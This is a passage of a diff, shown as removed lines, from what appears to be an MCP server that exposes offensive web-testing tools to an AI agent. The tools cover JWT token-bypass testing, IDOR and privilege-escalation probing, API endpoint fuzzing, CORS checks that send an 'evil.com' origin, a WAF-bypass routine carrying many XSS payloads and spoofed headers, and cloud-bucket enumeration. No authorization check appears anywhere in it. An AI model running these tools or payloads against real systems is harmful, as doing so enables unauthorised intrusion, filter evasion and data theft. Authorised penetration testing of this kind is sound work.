-        target_url = target if target.startswith("http") else f"https://{target}"
-        for exploit in exploits[:3]:
-            test_cmd = ["curl", "-sk", "--max-time", "10", "-H", f"Authorization: Bearer {exploit['token']}", target_url]
-            result = run_command_advanced(test_cmd, timeout=15, trace=trace)
-            status_code = ""
-            if result["success"]:
-                # Check if we got a non-401 response
-                body = result["stdout"]
-                if "unauthorized" not in body.lower() and "invalid" not in body.lower():
-                    exploit["result"] = "POSSIBLE_BYPASS"
-                    findings.append({
-                        "type": "JWT_BYPASS_CONFIRMED", "severity": "CRITICAL",
-                        "exploit": exploit["name"],
-                        "detail": f"Server accepted manipulated token ({exploit['name']})"
-                    })
-                else:
-                    exploit["result"] = "rejected"
-    
-    progress.update("Complete")
-    output = {
-        "status": "success",
-        "header": header,
-        "payload": payload_data,
-        "algorithm": alg,
-        "total_findings": len(findings),
-        "critical_findings": [f for f in findings if f.get("severity") == "CRITICAL"],
-        "findings": findings,
-        "exploit_tokens": exploits,
-        "recommendations": [
-            "Test each exploit token against authenticated endpoints",
-            "Try alg:none bypass on all protected routes",
-            "If RS256, try key confusion attack with public key",
-            "Check if expired tokens are still accepted",
-        ],
-    }
-    
-    output = chain_engine.enrich_with_context("enhanced_jwt_analyzer", target or "jwt_analysis", output)
-    log_tool_execution("enhanced_jwt_analyzer", target or "jwt_analysis", inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def enhanced_idor_scanner(
-    target: str,
-    endpoint: str = "",
-    id_param: str = "id",
-    auth_token: str = "",
-    id_type: str = "auto",
-    timeout: int = 120
-) -> str:
-    """
-    Enhanced IDOR scanner with UUID, base64, hash detection and privilege escalation testing.
-    ID types: auto, sequential, uuid, base64, hash
-    Tests: horizontal access (user A -> user B), vertical access (user -> admin).
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("enhanced_idor_scanner", target, 6)
-    inputs = {"target": target, "endpoint": endpoint, "id_param": id_param, "id_type": id_type}
-    
-    url = target if target.startswith("http") else f"https://{target}"
-    if endpoint:
-        url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
-    
-    findings = []
-    
-    # Step 1: ID type detection
-    progress.update("Detecting ID pattern")
-    
-    # Generate test IDs based on type
-    test_ids = []
-    if id_type == "auto" or id_type == "sequential":
-        test_ids.extend([("sequential", str(i)) for i in range(1, 21)])
-    if id_type == "auto" or id_type == "uuid":
-        import uuid as uuid_mod
-        test_ids.extend([
-            ("uuid", "00000000-0000-0000-0000-000000000001"),
-            ("uuid", "00000000-0000-0000-0000-000000000002"),
-            ("uuid", str(uuid_mod.uuid4())),
-        ])
-    if id_type == "auto" or id_type == "base64":
-        test_ids.extend([
-            ("base64", base64.b64encode(b"1").decode()),
-            ("base64", base64.b64encode(b"2").decode()),
-            ("base64", base64.b64encode(b"admin").decode()),
-            ("base64", base64.b64encode(b"user").decode()),
-        ])
-    if id_type == "auto" or id_type == "hash":
-        import hashlib
-        test_ids.extend([
-            ("hash_md5", hashlib.md5(b"1").hexdigest()),
-            ("hash_md5", hashlib.md5(b"2").hexdigest()),
-            ("hash_md5", hashlib.md5(b"admin").hexdigest()),
-        ])
-    
-    # Step 2: Baseline request
-    progress.update("Establishing baseline")
-    headers_opt = ["-H", f"Authorization: Bearer {auth_token}"] if auth_token else []
-    
-    baseline_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}"] + headers_opt + [url]
-    baseline_result = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
-    baseline_body = baseline_result.get("stdout", "")
-    baseline_parts = baseline_body.rsplit("\n", 1)
-    baseline_status = baseline_parts[-1] if len(baseline_parts) > 1 else ""
-    baseline_content = baseline_parts[0] if len(baseline_parts) > 1 else baseline_body
-    
-    # Step 3: Test each ID
-    progress.update("Testing IDOR payloads", f"{len(test_ids)} IDs to test")
-    responses = []
-    
-    for id_type_name, test_id in test_ids[:20]:
-        # Try as query param
-        test_url = f"{url}?{id_param}={test_id}"
-        test_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}|%{size_download}"] + headers_opt + [test_url]
-        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
-        
-        stdout = result.get("stdout", "")
-        parts = stdout.rsplit("\n", 1)
-        response_meta = parts[-1] if len(parts) > 1 else ""
-        response_body = parts[0] if len(parts) > 1 else stdout
-        
-        meta_parts = response_meta.split("|")
-        status = meta_parts[0] if meta_parts else ""
-        size = meta_parts[1] if len(meta_parts) > 1 else "0"
-        
-        responses.append({
-            "id_type": id_type_name, "id_value": test_id,
-            "status": status, "size": size,
-            "has_content": len(response_body) > 50
-        })
-        
-        # Check for IDOR indicators
-        if status == "200" and len(response_body) > 50:
-            # Different content for different IDs = possible IDOR
-            if response_body != baseline_content:
-                findings.append({
-                    "type": "POSSIBLE_IDOR", "severity": "HIGH",
-                    "id_type": id_type_name, "id_value": test_id,
-                    "param": id_param, "status_code": status,
-                    "detail": f"Different content returned for {id_param}={test_id}"
-                })
-    
-    # Step 4: Analyze response patterns
-    progress.update("Analyzing response patterns")
-    
-    # Check for consistent 200s with different sizes (strong IDOR indicator)
-    ok_responses = [r for r in responses if r["status"] == "200" and r["has_content"]]
-    sizes = set(r["size"] for r in ok_responses)
-    if len(ok_responses) > 2 and len(sizes) > 1:
-        findings.append({
-            "type": "IDOR_CONFIRMED", "severity": "CRITICAL",
-            "detail": f"Multiple IDs return different content sizes: {sizes}",
-            "param": id_param,
-            "evidence": f"{len(ok_responses)} successful responses with varying sizes"
-        })
-    
-    # Check 401 vs 403 pattern (access control leak)
-    auth_responses = [r for r in responses if r["status"] in ["401", "403"]]
-    if auth_responses:
-        statuses_401 = [r for r in auth_responses if r["status"] == "401"]
-        statuses_403 = [r for r in auth_responses if r["status"] == "403"]
-        if statuses_401 and statuses_403:
-            findings.append({
-                "type": "ACCESS_CONTROL_LEAK", "severity": "MEDIUM",
-                "detail": "Mix of 401/403 responses reveals which resources exist vs don't exist",
-                "ids_401": [r["id_value"] for r in statuses_401[:5]],
-                "ids_403": [r["id_value"] for r in statuses_403[:5]],
-            })
-    
-    # Step 5: Privilege escalation test
-    progress.update("Privilege escalation testing")
-    priv_esc_findings = []
-    admin_indicators = ["admin", "root", "superuser", "0", "1"]
-    for admin_id in admin_indicators:
-        test_url = f"{url}?{id_param}={admin_id}"
-        test_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}"] + headers_opt + [test_url]
-        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
-        stdout = result.get("stdout", "")
-        parts = stdout.rsplit("\n", 1)
-        status = parts[-1] if len(parts) > 1 else ""
-        if status == "200":
-            priv_esc_findings.append({
-                "type": "VERTICAL_IDOR", "severity": "CRITICAL",
-                "admin_id": admin_id, "detail": f"Admin resource accessible with {id_param}={admin_id}"
-            })
-    
-    findings.extend(priv_esc_findings)
-    
-    progress.update("Complete")
-    output = {
-        "status": "success",
-        "target": target,
-        "endpoint": endpoint,
-        "id_param": id_param,
-        "ids_tested": len(test_ids[:20]),
-        "total_findings": len(findings),
-        "confirmed_idor": [f for f in findings if f["type"] == "IDOR_CONFIRMED"],
-        "possible_idor": [f for f in findings if f["type"] == "POSSIBLE_IDOR"],
-        "privilege_escalation": priv_esc_findings,
-        "response_analysis": {
-            "total_200": len([r for r in responses if r["status"] == "200"]),
-            "total_403": len([r for r in responses if r["status"] == "403"]),
-            "total_404": len([r for r in responses if r["status"] == "404"]),
-            "unique_sizes": len(sizes) if ok_responses else 0,
-        },
-        "all_findings": findings,
-    }
-    
-    output = chain_engine.enrich_with_context("enhanced_idor_scanner", target, output)
-    log_tool_execution("enhanced_idor_scanner", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def enhanced_api_discovery(
-    target: str,
-    mode: str = "smart",
-    include_swagger: bool = True,
-    include_graphql: bool = True,
-    include_method_probing: bool = True,
-    timeout: int = 180
-) -> str:
-    """
-    Enhanced API endpoint discovery with Swagger/OpenAPI detection, GraphQL probing,
-    method enumeration, and intelligent parameter discovery via error analysis.
-    Discovers undocumented/hidden API endpoints using response code analysis.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("enhanced_api_discovery", target, 8)
-    inputs = {"target": target, "mode": mode}
-    
-    url = target if target.startswith("http") else f"https://{target}"
-    discovered_endpoints = []
-    api_docs = {}
-    
-    # Step 1: Swagger/OpenAPI detection
-    progress.update("Searching for API documentation")
-    if include_swagger:
-        swagger_paths = [
-            "/swagger.json", "/swagger/v1/swagger.json", "/swagger-ui.html",
-            "/api-docs", "/api-docs.json", "/v2/api-docs", "/v3/api-docs",
-            "/openapi.json", "/openapi.yaml", "/openapi/v3",
-            "/docs", "/redoc", "/api/docs", "/api/schema",
-            "/_catalog", "/api/swagger.json",
-        ]
-        for path in swagger_paths:
-            probe_url = f"{url.rstrip('/')}{path}"
-            probe_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}", probe_url]
-            result = run_command_advanced(probe_cmd, timeout=12, trace=trace)
-            stdout = result.get("stdout", "")
-            parts = stdout.rsplit("\n", 1)
-            status = parts[-1] if len(parts) > 1 else ""
-            body = parts[0] if len(parts) > 1 else stdout
-            
-            if status == "200" and len(body) > 50:
-                api_docs[path] = {"status": "found", "size": len(body)}
-                # Try to parse endpoints from swagger
-                try:
-                    swagger_data = json.loads(body)
-                    if "paths" in swagger_data:
-                        for api_path in swagger_data["paths"]:
-                            methods = list(swagger_data["paths"][api_path].keys())
-                            discovered_endpoints.append({
-                                "path": api_path, "methods": methods,
-                                "source": "swagger", "status": "documented"
-                            })
-                except (json.JSONDecodeError, KeyError):
-                    pass
-    
-    # Step 2: GraphQL detection
-    progress.update("GraphQL endpoint detection")
-    if include_graphql:
-        graphql_paths = ["/graphql", "/graphiql", "/playground", "/api/graphql", "/gql", "/query"]
-        for path in graphql_paths:
-            gql_url = f"{url.rstrip('/')}{path}"
-            # Test introspection query
-            gql_cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST",
-                      "-H", "Content-Type: application/json",
-                      "-d", '{"query":"{ __schema { types { name } } }"}',
-                      gql_url]
-            result = run_command_advanced(gql_cmd, timeout=15, trace=trace)
-            if result["success"] and "__schema" in result.get("stdout", ""):
-                api_docs["graphql"] = {"path": path, "introspection": True}
-                discovered_endpoints.append({
-                    "path": path, "methods": ["POST"],
-                    "source": "graphql", "status": "introspection_enabled",
-                    "severity": "HIGH"
-                })
-    
-    # Step 3: API prefix enumeration
-    progress.update("API prefix enumeration")
-    api_prefixes = [
-        "/api", "/api/v1", "/api/v2", "/api/v3",
-        "/rest", "/rest/v1", "/v1", "/v2", "/v3",
-        "/internal", "/private", "/admin/api",
-    ]
-    found_prefixes = []
-    
-    for prefix in api_prefixes:
-        prefix_url = f"{url.rstrip('/')}{prefix}"
-        prefix_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", prefix_url]
-        result = run_command_advanced(prefix_cmd, timeout=10, trace=trace)
-        status = result.get("stdout", "").strip()
-        if status not in ["404", "000"]:
-            found_prefixes.append({"prefix": prefix, "status": status})
-            discovered_endpoints.append({
-                "path": prefix, "status_code": status,
-                "source": "prefix_enum", "type": "api_root"
-            })
-    
-    # Step 4: Common endpoint fuzzing under discovered prefixes
-    progress.update("Endpoint fuzzing under API prefixes")
-    common_endpoints = [
-        "users", "user", "admin", "auth", "login", "register", "signup",
-        "profile", "account", "settings", "config", "health", "status",
-        "info", "version", "search", "upload", "download", "file", "files",
-        "data", "export", "import", "backup", "logs", "events", "webhook",
-        "token", "refresh", "logout", "password", "reset", "verify",
-        "organizations", "teams", "roles", "permissions",
-    ]
-    
-    for prefix_info in found_prefixes[:3]:
-        prefix = prefix_info["prefix"]
-        for ep in common_endpoints:
-            ep_url = f"{url.rstrip('/')}{prefix}/{ep}"
-            ep_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", ep_url]
-            result = run_command_advanced(ep_cmd, timeout=8, trace=trace)
-            status = result.get("stdout", "").strip()
-            if status in ["200", "201", "401", "403", "405", "422"]:
-                discovered_endpoints.append({
-                    "path": f"{prefix}/{ep}", "status_code": status,
-                    "source": "fuzzing"
-                })
-    
-    # Step 5: Method probing on discovered endpoints
-    progress.update("Method probing")
-    method_findings = []
-    if include_method_probing:
-        http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
-        interesting_endpoints = [ep for ep in discovered_endpoints 
-                               if ep.get("status_code") in ["401", "403", "405"]][:5]
-        
-        for ep in interesting_endpoints:
-            ep_url = f"{url.rstrip('/')}{ep['path']}"
-            for method in http_methods:
-                m_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null",
-                        "-w", "%{http_code}", "-X", method, ep_url]
-                result = run_command_advanced(m_cmd, timeout=8, trace=trace)
-                status = result.get("stdout", "").strip()
-                if status not in ["404", "405", "000"]:
-                    method_findings.append({
-                        "path": ep["path"], "method": method, "status": status
-                    })
-    
-    # Step 6: Error-based parameter discovery
-    progress.update("Error-based parameter discovery")
-    param_hints = []
-    interesting_200s = [ep for ep in discovered_endpoints if ep.get("status_code") == "422"][:3]
-    
-    for ep in interesting_200s:
-        ep_url = f"{url.rstrip('/')}{ep['path']}"
-        # Send invalid JSON to get error hints
-        err_cmd = ["curl", "-sk", "--max-time", "8", "-X", "POST",
-                  "-H", "Content-Type: application/json",
-                  "-d", '{"invalid": true}', ep_url]
-        result = run_command_advanced(err_cmd, timeout=12, trace=trace)
-        body = result.get("stdout", "")
-        # Look for field names in error messages
-        field_patterns = re.findall(r'"([a-zA-Z_]+)"\s*(?:is required|missing|invalid|must be)', body)
-        if field_patterns:
-            param_hints.append({
-                "path": ep["path"], "discovered_params": field_patterns
-            })
-    
-    progress.update("Complete")
-    output = {
-        "status": "success",
-        "target": target,
-        "total_endpoints": len(discovered_endpoints),
-        "api_documentation": api_docs,
-        "discovered_prefixes": found_prefixes,
-        "discovered_endpoints": discovered_endpoints,
-        "method_findings": method_findings,
-        "param_hints": param_hints,
-        "graphql_detected": "graphql" in api_docs,
-        "swagger_detected": any("swagger" in k or "api-docs" in k for k in api_docs.keys()),
-        "summary": {
-            "accessible_200": len([e for e in discovered_endpoints if e.get("status_code") == "200"]),
-            "auth_required_401": len([e for e in discovered_endpoints if e.get("status_code") == "401"]),
-            "forbidden_403": len([e for e in discovered_endpoints if e.get("status_code") == "403"]),
-            "method_denied_405": len([e for e in discovered_endpoints if e.get("status_code") == "405"]),
-        },
-    }
-    
-    output = chain_engine.enrich_with_context("enhanced_api_discovery", target, output)
-    log_tool_execution("enhanced_api_discovery", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-
-
-# ============================================================================
-# ENHANCED MODULES — PHASE 3: EXPLOITATION & ADVANCED DETECTION
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def enhanced_cors_scanner(
-    target: str,
-    test_credentials: bool = True,
-    test_null_origin: bool = True,
-    test_subdomains: bool = True,
-    timeout: int = 60
-) -> str:
-    """
-    Enhanced CORS misconfiguration scanner.
-    Tests: null origin, wildcard with credentials, subdomain reflection,
-    preflight bypass, Access-Control-Allow-Headers injection.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("enhanced_cors_scanner", target, 6)
-    inputs = {"target": target}
-    
-    url = target if target.startswith("http") else f"https://{target}"
-    domain = target.replace("https://", "").replace("http://", "").split("/")[0]
-    findings = []
-    
-    # Step 1: Baseline CORS headers
-    progress.update("Baseline CORS analysis")
-    baseline_cmd = ["curl", "-skI", "--max-time", "10", "-H", f"Origin: https://evil.com", url]
-    baseline = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
-    headers_lower = baseline.get("stdout", "").lower()
-    
-    if "access-control-allow-origin: *" in headers_lower:
-        findings.append({"type": "WILDCARD_ORIGIN", "severity": "HIGH",
-                        "detail": "CORS allows any origin (*)"})
-    if "access-control-allow-origin: https://evil.com" in headers_lower:
-        findings.append({"type": "ORIGIN_REFLECTION", "severity": "CRITICAL",
-                        "detail": "Origin reflected back - any domain can access resources"})
-    if "access-control-allow-credentials: true" in headers_lower:
-        findings.append({"type": "CREDENTIALS_ALLOWED", "severity": "CRITICAL" if findings else "HIGH",
-                        "detail": "Credentials allowed with permissive origin = full account takeover possible"})
-    
-    # Step 2: Null origin test
-    progress.update("Null origin test")
-    if test_null_origin:
-        null_cmd = ["curl", "-skI", "--max-time", "10", "-H", "Origin: null", url]
-        null_result = run_command_advanced(null_cmd, timeout=15, trace=trace)
-        if "access-control-allow-origin: null" in null_result.get("stdout", "").lower():
-            findings.append({"type": "NULL_ORIGIN_ALLOWED", "severity": "CRITICAL",
-                            "detail": "Null origin accepted - exploitable via sandboxed iframes"})
-    
-    # Step 3: Subdomain reflection
-    progress.update("Subdomain reflection test")
-    if test_subdomains:
-        subdomain_origins = [
-            f"https://evil.{domain}", f"https://{domain}.evil.com",
-            f"https://sub.{domain}", f"https://attacker-{domain}",
-            f"https://{domain}%60attacker.com", f"https://{domain}%2eevil.com",
-        ]
-        for origin in subdomain_origins:
-            sub_cmd = ["curl", "-skI", "--max-time", "8", "-H", f"Origin: {origin}", url]
-            sub_result = run_command_advanced(sub_cmd, timeout=12, trace=trace)
-            response_lower = sub_result.get("stdout", "").lower()
-            if f"access-control-allow-origin: {origin.lower()}" in response_lower:
-                findings.append({"type": "SUBDOMAIN_BYPASS", "severity": "CRITICAL",
-                                "origin": origin,
-                                "detail": f"CORS accepts attacker subdomain: {origin}"})
-                break
-    
-    # Step 4: Preflight method testing
-    progress.update("Preflight analysis")
-    preflight_cmd = ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS",
-                    "-H", "Origin: https://evil.com",
-                    "-H", "Access-Control-Request-Method: PUT",
-                    "-H", "Access-Control-Request-Headers: X-Custom-Header,Authorization",
-                    "-I", url]
-    preflight_result = run_command_advanced(preflight_cmd, timeout=15, trace=trace)
-    preflight_headers = preflight_result.get("stdout", "").lower()
-    
-    if "access-control-allow-methods" in preflight_headers:
-        allowed = ""
-        for line in preflight_result.get("stdout", "").split("\n"):
-            if "access-control-allow-methods" in line.lower():
-                allowed = line.split(":", 1)[1].strip() if ":" in line else ""
-        if any(m in allowed.upper() for m in ["PUT", "DELETE", "PATCH"]):
-            findings.append({"type": "DANGEROUS_METHODS_CORS", "severity": "HIGH",
-                            "methods": allowed,
-                            "detail": f"CORS allows dangerous methods: {allowed}"})
-    
-    if "access-control-allow-headers" in preflight_headers:
-        for line in preflight_result.get("stdout", "").split("\n"):
-            if "access-control-allow-headers" in line.lower():
-                allowed_headers = line.split(":", 1)[1].strip() if ":" in line else ""
-                if "authorization" in allowed_headers.lower():
-                    findings.append({"type": "AUTH_HEADER_CORS", "severity": "HIGH",
-                                    "detail": f"CORS allows Authorization header cross-origin"})
-    
-    # Step 5: Credentials + origin combo (most dangerous)
-    progress.update("Credentials + origin exploit testing")
-    if test_credentials:
-        cred_cmd = ["curl", "-skI", "--max-time", "10",
-                   "-H", "Origin: https://evil.com",
-                   "-H", "Cookie: session=test", url]
-        cred_result = run_command_advanced(cred_cmd, timeout=15, trace=trace)
-        cred_headers = cred_result.get("stdout", "").lower()
-        if ("access-control-allow-credentials: true" in cred_headers and
-            "access-control-allow-origin: https://evil.com" in cred_headers):
-            findings.append({"type": "FULL_CORS_EXPLOIT", "severity": "CRITICAL",
-                            "detail": "CRITICAL: credentials:true + reflected origin = FULL ACCOUNT TAKEOVER",
-                            "exploit": "Attacker can steal authenticated data from any logged-in user"})
-    
-    output = {
-        "status": "success",
-        "target": target,
-        "total_findings": len(findings),
-        "critical_count": len([f for f in findings if f.get("severity") == "CRITICAL"]),
-        "findings": findings,
-        "exploitable": any(f.get("severity") == "CRITICAL" for f in findings),
-        "cors_attack_scenarios": [
-            "1. Host malicious page on attacker domain",
-            "2. Victim visits attacker page while authenticated",
-            "3. JavaScript fetches target API with credentials",
-            "4. Victim's data exfiltrated to attacker server",
-        ] if any(f.get("severity") == "CRITICAL" for f in findings) else [],
-    }
-    
-    output = chain_engine.enrich_with_context("enhanced_cors_scanner", target, output)
-    log_tool_execution("enhanced_cors_scanner", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def enhanced_waf_bypass(
-    target: str,
-    waf_type: str = "auto",
-    test_payload: str = "<script>alert(1)</script>",
-    timeout: int = 120
-) -> str:
-    """
-    Active WAF bypass testing. Detects WAF type then tests specific bypass techniques.
-    Supports: Cloudflare, AWS WAF, ModSecurity, Imperva, Akamai, F5.
-    Tests: encoding bypass, case variation, unicode, null bytes, HTTP smuggling indicators.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("enhanced_waf_bypass", target, 7)
-    inputs = {"target": target, "waf_type": waf_type, "test_payload": test_payload}
-    
-    url = target if target.startswith("http") else f"https://{target}"
-    findings = []
-    
-    # Step 1: WAF detection
-    progress.update("WAF detection")
-    waf_detected = waf_type
-    if waf_type == "auto":
-        detect_cmd = ["curl", "-skI", "--max-time", "10", f"{url}/?test=<script>alert(1)</script>"]
-        detect_result = run_command_advanced(detect_cmd, timeout=15, trace=trace)
-        response = detect_result.get("stdout", "").lower()
-        
-        if "cf-ray" in response or "server: cloudflare" in response:
-            waf_detected = "cloudflare"
-        elif "x-amzn-waf" in response or "awswaf" in response:
-            waf_detected = "aws_waf"
-        elif "mod_security" in response or "modsecurity" in response:
-            waf_detected = "modsecurity"
-        elif "incap_ses" in response:
-            waf_detected = "imperva"
-        elif "akamai" in response:
-            waf_detected = "akamai"
-        elif "bigip" in response or "x-wa-info" in response:
-            waf_detected = "f5"
-        elif "403" in response or "406" in response:
-            waf_detected = "unknown"
-        else:
-            waf_detected = "none_detected"
-    
-    # Step 2: Get baseline (blocked response)
-    progress.update("Getting baseline blocked response")
-    blocked_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}|%{size_download}",
-                  f"{url}/?payload={test_payload}"]
-    blocked_result = run_command_advanced(blocked_cmd, timeout=15, trace=trace)
-    blocked_stdout = blocked_result.get("stdout", "")
-    parts = blocked_stdout.rsplit("\n", 1)
-    blocked_meta = parts[-1] if len(parts) > 1 else ""
-    blocked_code = blocked_meta.split("|")[0] if "|" in blocked_meta else ""
-    
-    # Step 3: Bypass techniques
-    progress.update("Testing bypass techniques")
-    bypass_payloads = {
-        "double_url_encode": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
-        "unicode_bypass": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
-        "case_variation": "<ScRiPt>alert(1)</ScRiPt>",
-        "null_byte": "<scri%00pt>alert(1)</scri%00pt>",
-        "html_entities": "&#60;script&#62;alert(1)&#60;/script&#62;",
-        "concat_bypass": "<scr"+"ipt>alert(1)</scr"+"ipt>",
-        "svg_bypass": "<svg/onload=alert(1)>",
-        "img_bypass": "<img src=x onerror=alert(1)>",
-        "event_bypass": "<body onload=alert(1)>",
-        "data_uri": "data:text/html,<script>alert(1)</script>",
-        "tab_bypass": "<script\t>alert(1)</script>",
-        "newline_bypass": "<script\n>alert(1)</script>",
-        "comment_bypass": "<script>/**/alert(1)</script>",
-        "backtick_bypass": "<script>alert`1`</script>",
-    }
-    
-    # WAF-specific bypasses
-    if waf_detected == "cloudflare":
-        bypass_payloads.update({
-            "cf_svg": "<svg onload=prompt(1)>",
-            "cf_details": "<details open ontoggle=alert(1)>",
-            "cf_math": "<math><mtext><option><FAKEFAKE><option></option>",
-        })
-    elif waf_detected == "modsecurity":
-        bypass_payloads.update({
-            "modsec_comment": "<!--><script>alert(1)</script-->",
-            "modsec_multiline": "<script>\nalert(1)\n</script>",
-        })
-    
-    successful_bypasses = []
-    failed_bypasses = []
-    
-    for technique, payload in bypass_payloads.items():
-        test_url = f"{url}/?payload={payload}"
-        test_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}", test_url]
-        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
-        status = result.get("stdout", "").strip()
-        
-        if status == "200" and blocked_code in ["403", "406", "429"]:
-            successful_bypasses.append({
-                "technique": technique, "payload": payload,
-                "status": status, "detail": f"WAF bypassed with {technique}!"
-            })
-        elif status != blocked_code and status not in ["000", ""]:
-            successful_bypasses.append({
-                "technique": technique, "payload": payload,
-                "original_status": blocked_code, "bypass_status": status,
-                "detail": f"Different response ({blocked_code} → {status})"
-            })
-        else:
-            failed_bypasses.append(technique)
-    
-    # Step 4: Header-based bypass
-    progress.update("Header-based WAF bypass")
-    header_bypasses = [
-        ("X-Originating-IP", "127.0.0.1"),
-        ("X-Forwarded-For", "127.0.0.1"),
-        ("X-Remote-IP", "127.0.0.1"),
-        ("X-Original-URL", "/"),
-        ("X-Rewrite-URL", "/"),
-        ("Content-Type", "application/x-www-form-urlencoded"),
-        ("Transfer-Encoding", "chunked"),
-    ]
-    
-    for h_name, h_value in header_bypasses:
-        hdr_url = f"{url}/?payload={test_payload}"
-        hdr_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}",
-                  "-H", f"{h_name}: {h_value}", hdr_url]
-        result = run_command_advanced(hdr_cmd, timeout=12, trace=trace)
-        status = result.get("stdout", "").strip()
-        if status == "200" and blocked_code in ["403", "406", "429"]:
-            successful_bypasses.append({
-                "technique": f"header_{h_name}", "header": f"{h_name}: {h_value}",
-                "status": status, "detail": f"WAF bypassed with {h_name} header!"
-            })
-    
-    # Step 5: Rate limit testing
-    progress.update("Rate limit detection")
-    rate_limit_info = {}
-    for i in range(5):
-        rl_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", url]
-        rl_result = run_command_advanced(rl_cmd, timeout=8, trace=trace)
-        if rl_result.get("stdout", "").strip() == "429":
-            rate_limit_info = {"rate_limited_after": i + 1, "status": "429 detected"}
-            break
-    
-    # Step 6: Summary
-    progress.update("Complete")
-    output = {
-        "status": "success",
-        "target": target,
-        "waf_detected": waf_detected,
-        "blocked_status": blocked_code,
-        "total_bypasses_found": len(successful_bypasses),
-        "successful_bypasses": successful_bypasses,
-        "failed_techniques": len(failed_bypasses),
-        "rate_limit": rate_limit_info,
-        "severity": "CRITICAL" if successful_bypasses else "INFO",
-        "recommendations": [
-            f"WAF ({waf_detected}) has {len(successful_bypasses)} bypass vectors" if successful_bypasses
-            else f"WAF ({waf_detected}) blocked all {len(failed_bypasses)} bypass attempts"
-        ],
-    }
-    
-    output = chain_engine.enrich_with_context("enhanced_waf_bypass", target, output)
-    log_tool_execution("enhanced_waf_bypass", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def cloud_storage_enum(
-    target: str,
-    cloud_provider: str = "auto",
-    custom_prefixes: str = "",
-    timeout: int = 120
-) -> str:
-    """
-    Cloud storage bucket/blob enumeration.
-    Tests: AWS S3, Google Cloud Storage, Azure Blob Storage.
-    Discovers: publicly accessible buckets, listing enabled, sensitive files exposed.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("cloud_storage_enum", target, 5)
-    inputs = {"target": target, "cloud_provider": cloud_provider}
-    
-    domain = target.replace("https://", "").replace("http://", "").split("/")[0]
-    base_name = domain.split(".")[0]
-    findings = []
-    
-    # Generate bucket name variants
-    progress.update("Generating bucket name variants")
-    prefixes = [base_name]
-    if custom_prefixes:
-        prefixes.extend([p.strip() for p in custom_prefixes.split(",")])
-    
-    variants = []
-    suffixes = ["", "-backup", "-bak", "-prod", "-production", "-staging", "-stage",
-                "-dev", "-development", "-test", "-data", "-assets", "-static",
-                "-uploads", "-media", "-logs", "-private", "-public", "-internal",
-                "-archive", "-dump", "-export", "-db", "-database"]
-    
-    for prefix in prefixes:
-        for suffix in suffixes:
-            variants.append(f"{prefix}{suffix}")
-    
-    # Step 2: Test S3 buckets
-    progress.update("Testing AWS S3 buckets")
-    if cloud_provider in ["auto", "aws"]:
-        for bucket in variants[:30]:
-            s3_url = f"https://{bucket}.s3.amazonaws.com/"
-            s3_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", s3_url]
-            result = run_command_advanced(s3_cmd, timeout=8, trace=trace)
-            status = result.get("stdout", "").strip()
-            
-            if status == "200":
-                # Try to list contents
-                list_cmd = ["curl", "-sk", "--max-time", "8", s3_url]
-                list_result = run_command_advanced(list_cmd, timeout=12, trace=trace)
-                has_listing = "<ListBucketResult" in list_result.get("stdout", "")
-                findings.append({
-                    "type": "S3_BUCKET_PUBLIC", "severity": "CRITICAL" if has_listing else "HIGH",
-                    "bucket": bucket, "url": s3_url, "listing_enabled": has_listing,
-                    "detail": f"Public S3 bucket: {bucket}" + (" (LISTING ENABLED!)" if has_listing else "")
-                })
-            elif status == "403":
-                findings.append({
-                    "type": "S3_BUCKET_EXISTS", "severity": "LOW",
-                    "bucket": bucket, "detail": f"S3 bucket exists but access denied: {bucket}"
-                })
-    
-    # Step 3: Test GCS buckets
-    progress.update("Testing Google Cloud Storage")
-    if cloud_provider in ["auto", "gcp"]:
-        for bucket in variants[:20]:
-            gcs_url = f"https://storage.googleapis.com/{bucket}/"
-            gcs_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", gcs_url]
-            result = run_command_advanced(gcs_cmd, timeout=8, trace=trace)
-            status = result.get("stdout", "").strip()
-            
-            if status == "200":
-                findings.append({
-                    "type": "GCS_BUCKET_PUBLIC", "severity": "CRITICAL",
